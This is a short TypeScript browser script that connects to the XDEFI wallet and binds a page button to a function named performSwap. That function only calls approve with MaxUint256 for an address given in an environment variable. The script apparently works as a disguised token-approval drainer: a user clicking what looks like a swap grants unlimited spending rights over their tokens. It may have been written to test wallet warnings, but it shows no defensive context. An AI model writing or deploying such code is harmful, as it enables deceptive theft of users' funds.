import type { ContractRunner } from 'ethers';
import {
  BrowserProvider,
  Contract,
  type Eip1193Provider,
  MaxUint256,
} from 'ethers';

const target = process.env.TARGET;
if (!target) {
  throw new Error('process.env.TARGET is not defined');
}

if (
  !('xfi' in window) ||
  typeof window.xfi !== 'object' ||
  !window.xfi ||
  !('ethereum' in window.xfi)
) {
  throw new Error('Missing window.xfi or window.xfi.ethereum');
}
const provider = new BrowserProvider(window.xfi.ethereum as Eip1193Provider);

const txTo = process.env.TX_TO;
if (!txTo) {
  throw new Error('process.env.TX_TO is not defined');
}

const performSwap = async () => {
  const signer = await provider.getSigner();
  console.log({ signer });
  const runner: ContractRunner = signer;
  const contract = new Contract(
    target.toLowerCase(),
    [
      'function decimals() view returns (uint8)',
      'function allowance(address owner, address spender) view returns (uint)',
      'function approve(address spender, uint value)',
    ],
    runner,
  );

  if (!contract.approve) {
    throw new Error('Missing contract.approve');
  }

  await (await contract.approve(txTo, MaxUint256)).wait();
};

const button = document.querySelector('button');
if (!button) {
  throw new Error('button not found');
}
button.addEventListener('click', performSwap);
